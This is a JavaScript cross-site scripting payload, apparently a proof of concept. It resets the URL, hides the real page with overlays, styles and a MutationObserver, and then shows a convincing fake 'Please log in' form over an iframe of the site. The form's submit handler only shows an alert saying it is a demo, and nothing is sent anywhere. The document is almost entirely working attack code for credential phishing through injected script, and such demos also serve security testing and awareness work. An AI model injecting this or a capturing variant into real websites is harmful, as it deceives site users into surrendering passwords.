history.pushState(null, '', '/');

(() => {
  let started = false;
  const OUR_IDS = new Set(['xssWhite','xssRoot','xssKill']);

  // --- 1) Immediate white overlay on top of everything
  const addOverlay = () => {
    if (document.getElementById('xssWhite')) return;
    const o = document.createElement('div');
    o.id = 'xssWhite';
    o.style.cssText =
      'position:fixed;inset:0;background:#fff;opacity:1;' +
      'z-index:2147483647;transition:opacity .2s linear;pointer-events:all;';
    document.documentElement.appendChild(o); // attach to <html>, not <body>
  };
  addOverlay();

  // --- 2) Push the entire original page off-screen (inline !important)
  const hideBodyInline = () => {
    if (!document.body) return;
    const s = (p,v) => document.body.style.setProperty(p, v, 'important');
    s('opacity','0'); s('visibility','hidden'); s('pointer-events','none');
    s('position','fixed'); s('top','-10000px'); s('left','-10000px');
    s('width','1px'); s('height','1px'); s('overflow','hidden');
    s('transform','none'); s('transition','none'); s('animation','none');
    document.documentElement.style.setProperty('overflow','hidden','important');
    document.documentElement.style.setProperty('background','#fff','important');
  };
  if (document.body) hideBodyInline();
  else document.addEventListener('DOMContentLoaded', hideBodyInline);

  // --- 3) Kill-style in case inline styles get overridden later
  const kill = document.createElement('style');
  kill.id = 'xssKill';
  kill.textContent = `
    html{overflow:hidden !important;background:#fff !important}
    body{
      opacity:0 !important; visibility:hidden !important; pointer-events:none !important;
      position:fixed !important; top:-10000px !important; left:-10000px !important;
      width:1px !important; height:1px !important; overflow:hidden !important
    }
    /* If the site inserts extra siblings under <html>, hide them too */
    html>*:not(head):not(body):not(#xssRoot):not(#xssWhite){display:none !important}
  `;
  (document.head || document.documentElement).appendChild(kill);

  // --- 4) MutationObserver: hide anything added later outside our root
  const obs = new MutationObserver(recs => {
    const root = document.getElementById('xssRoot');
    recs.forEach(r => r.addedNodes.forEach(n => {
      if (n.nodeType !== 1) return;
      if (OUR_IDS.has(n.id)) return;
      if (root && root.contains(n)) return;
      // belt + suspenders: hide & move off-screen
      n.style.setProperty('display','none','important');
      n.style.setProperty('visibility','hidden','important');
      n.style.setProperty('pointer-events','none','important');
      n.style.setProperty('position','fixed','important');
      n.style.setProperty('top','-10000px','important');
      n.style.setProperty('left','-10000px','important');
      n.style.setProperty('width','1px','important');
      n.style.setProperty('height','1px','important');
    }));
  });
  obs.observe(document.documentElement, { childList:true, subtree:true });

  // --- 5) Schedule init: DOMContentLoaded+1000ms OR +1500ms absolute (first wins)
  const init = () => {
    if (started) return; started = true;

    const root = document.createElement('div');
    root.id = 'xssRoot';
    root.innerHTML = `
      <style>
        .xss-root{position:fixed;inset:0;z-index:2147483000;font-family:Arial,sans-serif}
        .xss-bg{position:absolute;inset:0;pointer-events:none}
        .xss-bg iframe{width:100%;height:100%;border:0;opacity:.9;transition:opacity .5s}
        .xss-dim{position:absolute;inset:0;background:#000;opacity:0;transition:opacity .5s;pointer-events:none}
        .xss-modal{
          position:absolute;left:50%;top:50%;
          transform:translate(-50%,-50%) scale(.96);
          opacity:0;transition:opacity .5s,transform .5s;
          width:420px;background:rgba(0,0,0,.85);color:#fff;padding:28px;border-radius:12px;
          box-shadow:0 10px 30px rgba(0,0,0,.5);font-size:18px;line-height:1.4
        }
        .xss-modal, .xss-modal *{box-sizing:border-box;font-family:Arial,sans-serif}
        .xss-modal h2{margin:0 0 16px;font-size:26px}
        .xss-field{margin:12px 0 0}
        .xss-label{display:block;margin:0 0 6px;font-size:16px;opacity:.95}
        .xss-input{
          display:block;width:100%;height:44px;padding:10px 12px;border-radius:6px;
          border:1px solid rgba(255,255,255,.32);background:rgba(255,255,255,.08);
          color:#fff;font-size:16px;outline:none
        }
        .xss-input:focus{border-color:rgba(255,255,255,.55);background:rgba(255,255,255,.12)}
        .xss-button{
          margin-top:18px;width:100%;height:46px;border:0;border-radius:8px;background:#fff;
          color:#000;font-weight:700;font-size:16px;cursor:pointer
        }
        /* Fade sequence (0.5s) starts 1000ms after init() */
        .xss-show .xss-bg iframe{opacity:.3}
        .xss-show .xss-dim{opacity:.4}
        .xss-show .xss-modal{opacity:1;transform:translate(-50%,-50%) scale(1)}
      </style>

      <div class="xss-root" id="xssStage">
        <div class="xss-bg"><iframe src="/" title="root-bg"></iframe></div>
        <div class="xss-dim"></div>
        <form class="xss-modal" id="xssForm" autocomplete="off">
          <h2>Please log in</h2>
          <div class="xss-field">
            <label class="xss-label" for="xssUser">Username</label>
            <input class="xss-input" id="xssUser" name="user">
          </div>
          <div class="xss-field">
            <label class="xss-label" for="xssPass">Password</label>
            <input class="xss-input" id="xssPass" type="password" name="pass">
          </div>
          <button class="xss-button" type="submit">Login</button>
        </form>
      </div>
    `;
    document.documentElement.appendChild(root); // not under <body>

    // fade out the white overlay
    const white = document.getElementById('xssWhite');
    if (white) { white.style.opacity = '0'; setTimeout(() => white.remove(), 220); }

    // 1000ms later: start the dim + popup reveal (0.5s)
    setTimeout(() => {
      const stage = document.getElementById('xssStage');
      if (stage) stage.classList.add('xss-show');
    }, 1000);

    // Demo submit action
    root.querySelector('#xssForm').addEventListener('submit', (e) => {
      e.preventDefault();
      alert('This is an XSS demo (no data has been captured by it)');
    });
  };

  const scheduleAfterDom = () => setTimeout(init, 1000);
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', scheduleAfterDom, { once: true });
  } else {
    scheduleAfterDom(); // DOM already ready
  }
  // Absolute failsafe
  setTimeout(init, 1500);
})();
